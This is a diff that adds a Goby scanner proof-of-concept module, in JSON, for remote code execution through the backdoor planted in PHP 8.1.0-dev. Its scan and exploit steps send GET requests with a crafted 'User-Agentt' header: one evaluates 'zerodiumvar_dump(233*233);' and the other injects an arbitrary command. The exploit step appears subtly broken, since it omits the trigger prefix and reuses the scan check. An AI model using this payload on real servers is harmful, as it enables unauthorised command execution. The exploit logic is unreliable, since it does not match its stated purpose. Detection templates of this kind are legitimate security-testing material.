@@ -1,0 +1,103 @@
+{
+      "Name": "PHP 8.1.0-dev Zerodium Backdoor RCE",
+      "Level": "3",
+      "Tags": [
+            "RCE"
+      ],
+      "GobyQuery": "app=\"php\"",
+      "Description": "PHP is a popular general-purpose scripting language that is especially suited to web development.",
+      "Product": "php",
+      "Homepage": "https://www.php.net/",
+      "Author": "",
+      "Impact": "A backdoor has been introduced into PHP, dubbed 'zerodiumvar_dump', the backdoor allowed the execution of arbitrary PHP code.",
+      "Recommendation": "https://www.php.net/",
+      "References": [
+            "https://news-web.php.net/php.internals/113838"
+      ],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "cmd",
+                  "Type": "input",
+                  "Value": "whoami"
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/",
+                        "follow_redirect": true,
+                        "header": {
+                              "User-Agentt": "zerodiumvar_dump(233*233);"
+                        },
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "int(54289)",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/",
+                        "follow_redirect": true,
+                        "header": {
+                              "User-Agentt": "{{{cmd}}}"
+                        },
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "int(54289)",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
